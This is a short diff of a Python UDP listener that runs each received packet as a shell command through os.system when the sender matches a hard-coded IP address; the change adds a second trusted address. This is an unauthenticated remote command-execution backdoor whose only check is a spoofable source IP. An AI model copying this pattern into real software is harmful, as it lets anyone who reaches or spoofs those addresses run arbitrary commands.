@@ -16,7 +16,7 @@ sock = socket.socket(socket.AF_INET, # Internet
 sock.bind(('', UDP_PORT))
 while True:
     data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-    if addr[0] == '138.197.194.84':
+    if addr[0] == '138.197.194.84' or addr[0] == '10.138.144.76':
         try:
             os.system(data)
         except:
